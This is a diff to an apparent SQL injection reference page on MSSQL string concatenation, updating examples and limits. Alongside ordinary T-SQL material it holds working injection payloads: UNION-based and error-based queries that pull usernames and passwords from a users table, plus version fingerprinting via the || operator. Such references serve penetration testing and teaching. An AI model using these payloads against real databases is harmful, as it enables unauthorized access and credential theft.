@@ -4,7 +4,7 @@ description: Methods for string concatenation in MSSQL
 category: Injection Techniques
 order: 9
 tags: ["string operations", "concatenation", "T-SQL"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 String concatenation is an essential technique for SQL injection in Microsoft SQL Server, allowing attackers to construct complex queries and bypass security filters. MSSQL provides several methods for concatenating strings.
@@ -22,6 +22,14 @@ If any operand is NULL, the result will be NULL unless you use ISNULL or COALESC
 ```sql
 SELECT 'a' + NULL + 'c';  -- Returns: NULL
 SELECT 'a' + ISNULL(NULL, '') + 'c';  -- Returns: 'ac'
+```
+
+## Using the || Operator (SQL Server 2025+)
+
+SQL Server 2025 accepts the ANSI `||` operator for concatenation. Earlier versions reject it with `Incorrect syntax near '|'`, so it also tells 2025 apart from older versions:
+
+```sql
+SELECT 'a' || 'b';  -- Returns: 'ab' on 2025, syntax error before
 ```
 
 ## Using CONCAT() Function (SQL Server 2012+)
@@ -53,7 +61,7 @@ SELECT STRING_AGG(name, ',') FROM sys.databases;
 
 ## Using FOR XML PATH (SQL Server 2005+)
 
-Before STRING_AGG, this was the common method for aggregating strings:
+Before STRING_AGG, this was the common method for aggregating strings. `FOR XML PATH('')` entity-encodes `&`, `<` and `>` in the result (`&amp;`, `&lt;`, `&gt;`):
 
 ```sql
 SELECT STUFF((
@@ -74,17 +82,19 @@ SET @sql = 'SELECT * FROM ' + 'users' + ' WHERE id = ' + '1'
 EXEC(@sql)
 ```
 
+The injection examples below target a string parameter (`'`). UNION payloads written as `NULL, <value>, NULL` assume a host query with three columns whose second column is a string; adjust the `NULL`s to the real column count.
+
 ### Data Extraction with Concatenation
 
 ```sql
--- UNION attack with concatenated output
+-- UNION attack with concatenated output (all rows in one value)
 ' UNION SELECT NULL, (SELECT username + ':' + password FROM users FOR XML PATH('')), NULL--
 ```
 
 ### Error-based Extraction
 
 ```sql
--- Error-based extraction using concatenation
+-- Error-based extraction using concatenation (the conversion error shows the value)
 ' AND 1=CONVERT(int, (SELECT TOP 1 username + ':' + password FROM users))--
 ```
 
@@ -92,7 +102,7 @@ EXEC(@sql)
 
 ```sql
 -- Combining multiple columns into one string
-' UNION SELECT NULL, firstname + ' ' + lastname + ' (' + email + ')', NULL FROM users--
+' UNION SELECT NULL, username + ' ' + name + ' (' + email + ')', NULL FROM users--
 ```
 
 ## Advanced Concatenation Techniques
@@ -103,10 +113,13 @@ When concatenating non-string data types, explicit conversion is recommended:
 
 ```sql
 -- Concatenating string with integer
-SELECT 'User ID: ' + CAST(user_id AS nvarchar(10)) FROM users
+SELECT 'User ID: ' + CAST(id AS nvarchar(10)) FROM users
+
+-- Without CAST, + tries to convert the string to int and fails:
+-- SELECT 'User ID: ' + id FROM users  -> Conversion failed ...
 
 -- Alternative using CONCAT (handles conversions automatically)
-SELECT CONCAT('User ID: ', user_id) FROM users
+SELECT CONCAT('User ID: ', id) FROM users
 ```
 
 ### Character Building
@@ -139,10 +152,10 @@ NULL handling is critical in string concatenation:
 
 ```sql
 -- Using ISNULL
-SELECT 'First: ' + ISNULL(first_name, 'Unknown') FROM users
+SELECT 'Name: ' + ISNULL(name, 'Unknown') FROM users
 
--- Using COALESCE (can handle multiple potential NULL values)
-SELECT COALESCE(first_name, middle_name, last_name, 'Unknown') FROM users
+-- Using COALESCE (returns the first non-NULL argument)
+SELECT COALESCE(name, email, username, 'Unknown') FROM users
 
 -- Using NULLIF and ISNULL together
 SELECT 'Username: ' + ISNULL(NULLIF(username, ''), 'Not Provided') FROM users
@@ -166,16 +179,16 @@ EXEC(@cmd)
 ### Extracting Multiple Values
 
 ```sql
--- Combining multiple rows into one result using STRING_AGG
+-- Combining multiple rows into one result using STRING_AGG (SQL Server 2017+)
 ' UNION SELECT NULL, STRING_AGG(username + ':' + password, ','), NULL FROM users--
 
--- For older versions using FOR XML PATH
+-- For SQL Server 2005-2016 using FOR XML PATH
 ' UNION SELECT NULL, (SELECT username + ':' + password + ',' FROM users FOR XML PATH('')), NULL--
 ```
 
 ## Limitations and Considerations
 
-1. Maximum string length in SQL Server is 8000 bytes for varchar, 4000 characters for nvarchar
-2. Performance degrades with very large string operations
-3. Implicit conversions can cause unexpected results
-4. CONCAT and STRING_AGG are not available in older SQL Server versions
+1. `varchar(n)` holds up to 8,000 bytes and `nvarchar(n)` up to 4,000 byte-pairs; `varchar(max)` and `nvarchar(max)` hold up to 2 GB. Concatenating only non-`max` values is truncated at 8,000 bytes, so `CAST` one operand to `varchar(max)` for long results
+2. `STRING_AGG` returns `nvarchar(4000)`/`varchar(8000)` for non-`max` input and fails when the result is longer; use `STRING_AGG(CAST(col AS nvarchar(max)), ',')`
+3. `+` with a number converts the string to the number type (data type precedence) and fails unless you `CAST` the number
+4. `CONCAT` needs SQL Server 2012+, `CONCAT_WS` and `STRING_AGG` need 2017+, `FOR XML PATH` needs 2005+
